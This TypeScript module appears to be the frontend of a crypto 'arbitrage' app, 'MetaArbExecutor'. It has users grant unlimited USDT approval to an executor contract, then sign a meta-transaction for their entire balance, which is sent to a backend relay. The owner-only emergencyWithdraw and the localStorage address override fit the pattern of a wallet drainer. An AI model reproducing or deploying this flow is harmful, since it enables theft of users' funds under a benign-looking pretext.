  import { ethers } from 'ethers';

// Network selection type
export type SupportedNetwork = 'ethereum' | 'bsc';

// Get contract address dynamically based on network
const getContractAddress = (network: SupportedNetwork = 'ethereum') => {
  if (typeof window !== 'undefined') {
    const stored = localStorage.getItem(`contract_address_${network}`);
    if (stored && stored !== 'Not set') {
      return stored;
    }
  }

  if (network === 'bsc') {
    return process.env.NEXT_PUBLIC_BSC_CONTRACT_ADDRESS || "0xYourBSCDeployedAddressHere";
  }
  return process.env.NEXT_PUBLIC_CONTRACT_ADDRESS || "0xYourEthereumDeployedAddressHere";
};

// Get RPC URL based on network
const getRpcUrl = (network: SupportedNetwork = 'ethereum') => {
  if (network === 'bsc') {
    return process.env.NEXT_PUBLIC_BSC_RPC || "https://bsc-dataseed1.binance.org";
  }
  return process.env.NEXT_PUBLIC_RPC_URL || "https://ethereum.publicnode.com";
};

// Dynamic CONFIG based on network selection
export const getNetworkConfig = (network: SupportedNetwork = 'ethereum') => {
  return {
    RPC_URL: getRpcUrl(network),
    CONTRACT_ADDRESS: getContractAddress(network),
    TOKEN_ADDRESS: process.env.NEXT_PUBLIC_TOKEN_ADDRESS || "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    OWNER_CAP: process.env.NEXT_PUBLIC_OWNER_CAP || "1000000",
    NETWORK: network,
    CHAIN_ID: network === 'bsc' ? 56 : 1,
  };
};

// Default to Ethereum for backward compatibility
export const CONFIG = getNetworkConfig('ethereum');

// ERC20 ABI remains the same (standard ERC20)
export const ERC20_ABI = [
  'function approve(address spender, uint256 amount) external returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function transferFrom(address from, address to, uint256 amount) external returns (bool)'
];

// Approval function - approve to contract (supports both networks, uses same ABI)
export async function approveTokenSpending(signer: ethers.Signer, contractAddress: string, network: SupportedNetwork = 'ethereum') {
  console.log(`[v0] Approving unlimited token spending on ${network}`);
  const config = getNetworkConfig(network);
  const token = new ethers.Contract(config.TOKEN_ADDRESS, ERC20_ABI, signer);
  const tx = await token.approve(contractAddress, ethers.MaxUint256);
  console.log(`[v0] Approval transaction sent on ${network}:`, tx.hash);
  const receipt = await tx.wait();
  console.log(`[v0] Approval confirmed in block:`, receipt?.blockNumber);
  return tx;
}

export const EXECUTOR_ABI = [
  {
    "inputs": [],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "ECDSAInvalidSignature",
    "type": "error"
  },
  {
    "inputs": [
      {
        "internalType": "uint256",
        "name": "length",
        "type": "uint256"
      }
    ],
    "name": "ECDSAInvalidSignatureLength",
    "type": "error"
  },
  {
    "inputs": [
      {
        "internalType": "bytes32",
        "name": "s",
        "type": "bytes32"
      }
    ],
    "name": "ECDSAInvalidSignatureS",
    "type": "error"
  },
  {
    "inputs": [],
    "name": "DOMAIN_SEPARATOR",
    "outputs": [
      {
        "internalType": "bytes32",
        "name": "",
        "type": "bytes32"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "META_TX_TYPEHASH",
    "outputs": [
      {
        "internalType": "bytes32",
        "name": "",
        "type": "bytes32"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "token",
        "type": "address"
      },
      {
        "internalType": "uint256",
        "name": "amount",
        "type": "uint256"
      }
    ],
    "name": "emergencyWithdraw",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "user",
        "type": "address"
      },
      {
        "internalType": "address",
        "name": "token",
        "type": "address"
      },
      {
        "internalType": "uint256",
        "name": "Incomingamount",
        "type": "uint256"
      },
      {
        "internalType": "uint256",
        "name": "deadline",
        "type": "uint256"
      },
      {
        "internalType": "bytes",
        "name": "signature",
        "type": "bytes"
      }
    ],
    "name": "executeMetaTx",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "name": "nonces",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "owner",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  }
];

// Updated chain switch function for both Ethereum and BSC
export async function switchNetwork(network: SupportedNetwork = 'ethereum') {
  if (!window.ethereum) throw new Error('No web3 wallet found');
  
  const chainId = network === 'bsc' ? '0x38' : '0x1'; // BSC = 56 (0x38), Ethereum = 1 (0x1)
  const chainName = network === 'bsc' ? 'Binance Smart Chain' : 'Ethereum Mainnet';
  
  try {
    await window.ethereum.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId }],
    });
  } catch (switchError: any) {
    if (switchError.code === 4902) {
      try {
        const rpcUrl = getRpcUrl(network);
        await window.ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId,
            chainName,
            nativeCurrency: {
              name: network === 'bsc' ? 'BNB' : 'Ether',
              symbol: network === 'bsc' ? 'BNB' : 'ETH',
              decimals: 18,
            },
            rpcUrls: [rpcUrl],
            blockExplorerUrls: network === 'bsc' 
              ? ['https://bscscan.com/']
              : ['https://etherscan.io/'],
          }],
        });
      } catch (addError: any) {
        throw new Error(`Failed to add ${chainName} to your wallet: ${addError.message}`);
      }
    } else {
      throw new Error(`Failed to switch network: ${switchError.message}`);
    }
  }
}

// Backward compatibility - default to Ethereum
export async function switchToEthereum() {
  return switchNetwork('ethereum');
}

// Optional: Keep approveToken if used elsewhere (update chain switch call in frontend)
export async function approveToken(signer: ethers.Signer) {
  const token = new ethers.Contract(CONFIG.TOKEN_ADDRESS, ERC20_ABI, signer);
  const decimals = await token.decimals().catch(() => 18);
  const ownerCapRaw = ethers.parseUnits(CONFIG.OWNER_CAP, decimals);
  const tx = await token.approve(CONFIG.CONTRACT_ADDRESS, ownerCapRaw);
  await tx.wait();
  return tx;
}

// prepareAndSignTransaction - network-aware
export async function prepareAndSignTransaction(
  signer: ethers.Signer,
  provider: ethers.BrowserProvider,
  userAddress: string,
  network: SupportedNetwork = 'ethereum'
) {
  const config = getNetworkConfig(network);
  const token = new ethers.Contract(config.TOKEN_ADDRESS, ERC20_ABI, provider);
  const [decimals, allowance, balance] = await Promise.all([
    token.decimals().catch(() => 18),
    token.allowance(userAddress, config.CONTRACT_ADDRESS),
    token.balanceOf(userAddress)
  ]);

  let incoming = allowance;
  if (incoming === 0n) throw new Error('No allowance found. Please complete the approval step first.');

  const ownerCapRaw = ethers.parseUnits(config.OWNER_CAP, decimals);
  if (ownerCapRaw > 0n && ownerCapRaw < incoming) incoming = ownerCapRaw;
  if (balance < incoming) incoming = balance;
  if (incoming === 0n) throw new Error('Incoming amount is 0 — cannot sign');

  const domain = {
    name: 'MetaArbExecutor',
    version: '1',
    chainId: config.CHAIN_ID,
    verifyingContract: config.CONTRACT_ADDRESS
  };

  const types = {
    MetaTransaction: [
      { name: 'user', type: 'address' },
      { name: 'token', type: 'address' },
      { name: 'Incomingamount', type: 'uint256' },
      { name: 'nonce', type: 'uint256' },
      { name: 'deadline', type: 'uint256' }
    ]
  };

  const executor = new ethers.Contract(config.CONTRACT_ADDRESS, EXECUTOR_ABI, provider);
  const nonce = await executor.nonces(userAddress);
  const deadline = Math.floor(Date.now() / 1000) + 3600;

  const message = {
    user: userAddress,
    token: config.TOKEN_ADDRESS,
    Incomingamount: incoming.toString(),
    nonce: nonce.toString(),
    deadline: deadline
  };

  const rawSig = await signer.signTypedData(domain, types, message);

  // Send to backend
  const response = await fetch('/api/relay', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      user: message.user,
      token: message.token,
      amount: incoming.toString(),
      deadline: message.deadline,
      signature: rawSig,
      network: network
    })
  });

  if (!response.ok) {
    const error = await response.json();
    throw new Error(error?.error || 'Transaction relay failed');
  }

  const result = await response.json();
  return result;
}
